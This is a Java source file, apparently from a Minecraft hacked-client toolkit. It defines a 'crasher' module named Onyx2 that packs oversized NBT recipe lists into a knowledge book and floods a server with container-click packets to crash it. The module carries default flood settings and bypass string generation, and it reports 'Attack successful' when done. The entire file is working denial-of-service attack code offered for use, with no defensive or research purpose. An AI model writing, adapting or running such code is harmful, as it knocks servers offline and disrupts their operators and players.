package us.rin.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.rin.crashers.Crasher;
import us.rin.gui.clickgui.ClickGui;
import us.rin.helpers.BypassHelper;
import us.rin.helpers.PacketHelper;
import us.rin.protocol.RedSignalProtocol;
import us.rin.protocol.components.data.DataComponents;
import us.rin.protocol.components.data.impl.DataRecipes;
import us.rin.protocol.components.objects.ItemType;
import us.rin.protocol.packets.PacketCodec;
import us.rin.protocol.packets.play.PacketContainerClick;
import us.rin.utils.OptionType;
import us.rin.utils.OptionUtil;

import java.util.List;
import java.util.Optional;

public class Onyx2 implements Crasher {
    private static final String METHOD_NAME = "Onyx2";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int length = Integer.parseInt(args[4]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        CompoundTag compoundTag = new CompoundTag();
        ListTag listTag = new ListTag();

        for (int i = 0; i < size; ++i)
            listTag.add(new StringTag(bypassHelper.generateString(length, BypassHelper.StringType.DEFAULT)));

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            DataRecipes dataRecipes = new DataRecipes(listTag);
            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataRecipes);

            us.rin.protocol.components.objects.ItemStack stack = new us.rin.protocol.components.objects.ItemStack(ItemType.KNOWLEDGE_BOOK.getId(protocol), 1, dataComponents);

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    stack, new Int2ObjectArrayMap<>()), packets);
        }else{
            compoundTag.put("Recipes", listTag);

            ItemStack stack = new ItemStack(Items.KNOWLEDGE_BOOK, 1, Optional.of(compoundTag));

            for (int i = 0; i < packets; i++)
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, stack, new Int2ObjectOpenHashMap<>()));

        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions(){
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER, null),
                new OptionUtil("Size", OptionType.INTEGER, null),
                new OptionUtil("Length", OptionType.INTEGER, null)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[500], Size[19521], Length[0]";
    }


    @Override
    public String getDescription() {
        return "Basic NBT 1.18-1.21.x Crasher";
    }
}
